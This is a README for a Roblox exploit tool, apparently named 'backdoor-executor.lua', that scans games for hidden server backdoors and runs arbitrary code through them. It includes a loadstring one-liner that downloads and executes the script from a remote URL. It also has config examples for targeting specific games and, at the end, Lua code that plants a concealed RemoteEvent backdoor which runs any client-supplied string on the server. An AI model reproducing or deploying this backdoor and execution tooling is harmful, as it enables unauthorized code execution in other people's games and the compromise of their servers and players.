# backdoor-executor.lua
(pls help me get a new name for this script)
might be better than [backdoor.exe](https://github.com/iK4oS/backdoor.exe).

## Info
This script is for [Roblox](https://roblox.com) scanning backdoors and executing them within a gui.
### Requirements
- A non skiddy brain that needs help for dumb reason
- Decent executor that supports filesystem functions (for config)
### Script
Just use the script below and execute it.
```lua
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/backdoor-executor.lua"))()
```
### Config Help
- My config has been gone back to original
> The config will reset to the original config if the configVer is lower than the original config
- Adding Cache Example
```lua
[placeid] = {
	["Path"] = "remote.path.here", -- this is the path of the remote, don't do remote.path["here"] or it will not work
	["Args"] = {"arg1here", "source"}, -- source shouldn't be deleted because its a arg for scripts that will be executed
	["Func"] = function(source) -- use this if a game has a custom encryption for source
		return source
	end
}
```
> if the cache didn't work backdoor-executor.lua will warn u that the cache is outdated
- Using AutoExecute
> add a script inside the autoExecute table, you can put many code as long as you want inside the table
```lua
["autoExec"] = {
	[[print("jLn0n is epic!")]],
	[[warn("backdoor-executor.lua needs a new name!")]]
},
```

## Adding a backdoor in your game
Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
Make sure to enable `Loadstring` in `ServerScriptService`. (credits to [backdoor.exe](https://github.com/iK4oS/backdoor.exe) for copying this thingy.)
```lua
local Remote = Instance.new("RemoteEvent")
Remote.Name = tostring(math.random(1e10,1e10))
Remote.Parent = game:GetService("Chat"):WaitForChild("ClientChatModules").MessageCreatorModules
Remote.OnServerEvent:Connect(function(player, execute)
	loadstring(execute)()
end)
```
